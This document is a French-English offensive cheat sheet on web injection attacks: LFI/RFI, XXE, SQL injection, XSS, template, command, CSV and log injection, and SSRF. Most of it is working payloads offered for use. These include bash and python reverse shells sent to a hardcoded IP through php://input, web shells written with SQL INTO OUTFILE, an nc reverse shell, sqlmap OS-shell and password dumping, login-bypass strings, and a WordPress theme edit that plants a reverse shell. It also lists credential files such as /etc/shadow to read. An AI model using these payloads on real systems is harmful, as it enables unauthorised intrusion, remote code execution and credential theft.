# Injections

## RFI

* On Kali : `nc -nlvp <PORT>`
* On target : `param=http://<IP>/<PORT>/<FILE>`
  * If `http` wrapper is disable try `ftp` - `expect`

## LFI

### Manually

* `php://filter/convert.base64-encode/resource=`
  * Le wrapper encode le code source en base64, le serveur ne peut donc pas exécuter le code puisqu'il ne trouve pas le , il renvoie donc le base 64
  * Copy and paste result in `<file>` then `cat <file> |base64 -d`
* Null byte injection : `param=/etc/passwd%00`
  * Works in versions below php 5.3
* Display PHPINFO : `param=phpinfo`
  * Vérifier les élements suivants:
    * `allow_url_fopen`
    * `allow_url_include` : Si **Off** ont ne peut pas aller récupérer un fichier depuis un web server
    * `Supported filetypes`
* `curl -s --data-urlencode param=../../../../../../../../../etc/passwd http://<IP>/<PATH>/<FILE>.php`
* LFI to RCE via phpinfo() - Winning The Race
  * Si on peut GET phpinfo.php - peut upload fichier
    * Changer la requête en `POST`
    * Changer `Content-Type` en `multipart/form-data; boundary=--SomeTextHere`
    *   Ajouter

        ```
         ----SomeTextHere
         Content-Disposition: form-data; name="anything"; filename="FileName"
         Content-Type: text/plain
         
         This is the file content
         ----SomeTextHere
        ```
    * Envoyer la requete et verifier si dans la partie "PHP variable" un fichier nommé "FileName" est présent
      * Si oui on verra aussi son chemin
  * [https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
    * Make a request
    * Sent big file who takes PHP time to process
    * Soon as the page finish loading PHP delete the file
    * Hitting the LFI before PHP delete the file
    * Modify the script
      * `PAYLOAD` : Put the payload between the , can add a full RS PHP on several lines
      * `LFIREQ` : Adapt in function of your environment - the `%s` is the filename
    * Start the script : `python phpinfolfi.py <IP> <PORT> <THREADS-NUMBER>`

```
/proc/self/environ
/proc/self/fd
php://input
php://input%00
```

* Requete :

```
POST /section.php?page=php://input%00 HTTP/1.1
[...]
page=Exploit PHP Wrappers
```

* Reponse (si fonctionne, répétition de la variable page) :

```
HTTP/1.1 200 OK
[...]
page=Exploit PHP Wrappers
```

* Requete :

```
POST /section.php?page=php://input%00 HTTP/1.1
[...]
<?php echo shell_exec('id'); ?>
```

* Reponse (si fonctionne, exécute le code PHP) :

```
HTTP/1.1 200 OK
[...]
uid=48(<XXX>) gid=48(<XXX>) groups=48(<XXX>)
```

* Using curl to get command execution : `curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://<IP>/<FILE>.php?page=php://input%00" -k -v`
*   Using Burp to get a bash reverse shell :

    ```
     POST /section.php?page=php://input%00 HTTP/1.1
     [...]
     <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.72/4444 0>&1'); ?>        
    ```
* Using curl to get a bash reverse shell : - `curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.72/4444 0>&1'); ?>" "https://<IP>/<FILE>.php?page=php://input%00" -k -v`
*   Using Burp to get a python reverse shell :

    ```
     POST /section.php?page=php://input%00 HTTP/1.1
     [...]
     <?php echo shell_exec(' python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' '); ?>
    ```

    * /!\ Il faut \ les ' qui sont dans la commande python
* File to check
  * Unix
    * dolibar : /conf/conf.php
    * drupal : dbconfig.php
    * apache : /etc/apache2/apache2.conf - /etc/apache2/sites-available/default - /usr/local/etc/apache22/httpd.conf
    * /etc/passwd
    * /etc/shadow
    * /etc/group
    * /etc/sudoers
  * Windows
    * WiP
* PHP function `include()` execute PHP between `<?php ?>`
  * Except if we use `php://filter/convert.base64-encode`

### Automatically

* kadimus

## XXE

```
Out of Band -> faire renvoyer sur son propre serveur
Format SVG contient du XML
```

[https://2017.zeronights.org/wp-content/uploads/materials/ZN17\_yarbabin\_XXE\_Jedi\_Babin.pdf](https://2017.zeronights.org/wp-content/uploads/materials/ZN17\_yarbabin\_XXE\_Jedi\_Babin.pdf) [https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/](https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/)

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY ent SYSTEM "file:///etc/passwd">]>
<data>&ent;</data>
```

* The `ent` variable can be injected in whatever `<balise>`

## SQLi

[http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html](http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html)

### Manual

#### Identifier le champ vulnérable

* `'`
* Operation arithmetique, vérifier si `cod=4-2` renvoie la même chose que `code=2`

#### Déterminer le nombre de colonnes

* Utiliser UNION SELECT plutot que ORDER BY
  * Identifier le nombre de colonnes et les colonnes vulnérables à l'affichage d'information : `id=-1 union select 1,2,3,4,5,6--`

#### Afficher des informations

* `version()`
* `database()`
* `user()`

#### Extraire des données basique

* WiP

#### Extraire des données death row

(**death row** -> utilisation de `group_concat()`)

* Bien positionner à **-1** (ou autre valeur entrainant l'absence de résultat)
  * Renvoie si tu ajoutes le `union select`
* Group\_concat function have a limit of 1024 characters and it will Trim the rest of characters
  * Dump **ALL the LINES** in **ONE REQUEST** with `CAST(GROUP_CONCAT() AS CHAR(<SIZE>))`
* Concaténer noms des tables de la BDD courante : `param=-1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--`
* Concaténer noms des colonnes de la table selectionnée : `param=-1 union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=CHAR(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)--`
  * CHAR() contient le nom de la table encodé
* Concaténer contenus des colonnes de la table selectionnée : `param=-1 union select 1,group_concat(<COLUMN_1>,0x3a,<COLUMN_2>),3,4,5,6 from <TABLE>--`

WiP :

* Si pas de retour sur la page --> BLIND
  * ex: panel auth
    * 1=1 : page qui indique que ça a marché
    * 2=1 : page qui indique que ça a PAS marché
    * comparer les résultats entre 1=1 et 1=2
* On peut utiliser len() pour identifier la version en BLIND, simplement en voyant le rendus de la page
* Utiliser LIKE '\_'
* SELECT INTO\_FILE

#### Extraire des données time based

* benchmark -> realise une action complique X fois
  * select benchmark(500000,MD5(xxx)) as dual where database() like '\_\_\_\_\_\_'
* sleep

```
ensuite scripter pour trouver les caractéres 1 par 1
définir un charset contenant "a-z,A-Z,1-9,-"
for c in charset
	string "" + c  + "______"
	date à 't'
	faire la requete
	date à 't+requete'
	faire la différence entre t & t+requete
	
Réexecuter le script manuellement pour chaque caractere 
	Pour chaque caractére trouvé, faire
		string "x" + c  + "_____"
			string "xy" + c  + "____"
				string "xyz" + c  + "___"
					string "xyza" + c  + "__"
						string "xyzab" + c  + "_"
							...
La comparaison peut aussi être faite en utilisatn substring()
```

* Pour time based on peut aussi faire LIKE '%'
  * tester tous les char 1 par 1 et décaler le %
    * quand sur le niém char on a testé tout le charset et que ça ne marche pas, on sait qu'on a atteint la taille max
* On peut Dump In One Shot en BLIND/TIME BASED
* mettre les noms des tables en HEXA pour eviter de mettre des quotes
* timbe based implique blind
* exemple dans une requete POST
  * `param1=xxxx&param2=xxx'||sleep(1)||'&param3=xxx`
* ERROR BASED
* Dump All In One Shot
* INTO OUTFILE (everse shell using SQL Injection)
  * Ecrire du code PHP dans un nouveau fichier .php : `mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/<PATH>/wp-content/<PATH>/<FILE>.php";`
  * Faire exécuter des commandes en les passant en paramétre au fichier .php : `https://<IP>:<PORT>/<PATH>/wp-content/<PATH>/<FILE>.php?cmd=<COMMAND>`
    * Récupérer un RS via l'exécuter de commandes du fichier .php : `?cmd=<REVERSE-SHELL>`
* SQL -> exfiltration via DNS
* leettime.com : entrainement SQLi
* rootme
* zenksecurity

#### Bypass Login:

* Champ user : `' OR 1=1 -- #`
* Champ user : `' or '1'='1`
  * `SELECT * FROM users WHERE username='$username' AND password='$password'`
* Champ user : `admin' -- -`
* Champ mdp : `1' or '1'='1`

```
POST /login-off.asp HTTP/1.1
[...]    
txtLoginID=%27+OR+1%3D1--&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login    
```

* `txtLoginID=admin&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login`
* `txtLoginID=%27+OR+1%3D2--&txtPassword=%27+OR+1%3D2--&cmdSubmit=Login`
* Redirection vers la page de login : `' OR 1=2--`
* Identification du nombres de colonnes : `txtLoginID=%20+UNION+SELECT+1,2,3,4--&txtPassword=%27+OR+1%3D1--&cmdSubmit=Login`
  * Si on ajoute / retire un chiffre on a une erreur 500 tout de suite, sans redirection

#### SQLi to shell

* Death row : WiP
  * Interroger le web shell : `curl -i -s -k -X $'GET' -H $'Host: 10.10.10.143' -H $'User-Agent: Mozilla/5.0' $'http://<IP>/<FILE>.php?cmd=whoami'`
  * Déployer un reverse shell : `GET /<FILE>.php?cmd=echo+'nc+-e /bin/sh <IP> <PORT>' > <FILE>.sh`
  * Ajouter les droits d'exécution : `GET /<FILE>.php?cmd=chmod +x <FILE>.sh`
  * Exécuter le reverse shell : `GET /<FILE>.php?cmd=./<FILE>.sh`

### Automated

* Confirme avec WFUZZ le nombre de colonnes (en comparrant le nombre de LINES, WORD, CHARS):
  * `wfuzz -c -b "<COOKIE_1>=<VALUE_1>; <COOKIE_2>=<VALUE_2>" -z range,1-15 "http://<IP>:<PORT>/<PATH>/<FILE>.php?tg=delegat&idx=mem&id=1 order by FUZZ"`
* ̀Déterminer les bases de données présentes : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" --dbs`
* Afficher les tables d'une base de donnée : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" -p id --tables -D <DB-name>`
* Récupérer le contenus d'une table : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?id=1" -p id -T <TABLE> --dump`
* Récupérer un shell : `sqlmap -u "http://<IP>/<PATH>/<FILE>.php?cod=1" -p <PARAM> --level 4 --risk 3 --dbms=MySQL --os-shell`
* Récupérer identifiants : `sqlmap -u 'http://<IP>/<PATH>/<FILE>.php?cod=5' --users --passwords`
* Faire la requete via burp - Copier la reqête - Sauvegarder dans un fichier .req - `sqlmap -r <FILE>.req`
  * `sqlmap -r <FILE> -p <PARAM> --force-ssl`

## XSS

Cross-Site Tracing (XST) : XSS + HTTP TRACE method

Mindmap : [https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png) [https://github.com/s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)

```
Vol de cookie
iframe, exploit navigateur
```

* Si `alert(` est interdit utiliser : `a=alert;a(1)`

## Template injection

En cas d'accés à une interface d'administration web, vérifier si il est possible de modifier les templates. Si oui, templacer un fichier d'aide/d'informations par un reverse shell

Tenter dés qu'on est admin dans une interface de CMS

### Wordpress

Modifier un fichier PHP au sein d'un THEME existant de façon a mettre un REVERSE SHELL

* Appearance > Editor
  * Theme par défaut
    * Fichier .PHP
      * Copier le code de `/usr/share/webshells/php/php-reverse-shell.php` (en modifier `$IP` & `$PORT`)
        * Enregister
* Se rendre sur `http://<IP>/wp/wp-content/themes/default/<FILE>.php`

## Command injection

### Bash

* `; id`
* `; bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`

### PHP

* Function `preg_replace`

## Injection inside CSV

Si l'application permet de générer des fichiers .CSV à partir de données utilisateur il est possible d'injecter des commandes

* `=cmd|' /C notepad'!'A1'`

## Injection dans les logs

Through Burp interceptor/repeater :

* Through the login field : `login%0d%0aTEST`
* Through the `User-Agent`
  * The `"` could be escaped
  * `<?php echo('Test here'); ?>`
    * If you can include the log file through a PHP file, the PHP will be executed
  * system($\_REQUEST\['param']);
    * `<FILE>.php=<FILE>.log&param=<COMMAND>`

Le `%0d%0a` va entrainer la création d'une nouvelle ligne en cas d'injection réussis

## SSRF

* Start a web server : `python -m SimpleHTTPServer`
* Try to reach your server : `http://<IP>:<PORT>`
* Try to access files : `file:///etc/passwd`
  * Try changing `file` case in case of filter on the keyword
* Try to reach the target locally : `http://localhost:<OPEN-PORT>`
  * Port scan : `wfuzz -c - z range,1-65535 http://<IP>:<PORT><PATH-TO-SSRF>/param=http://localhost:FUZZ`
    * Filter : `--hc/hl/hw/hh`
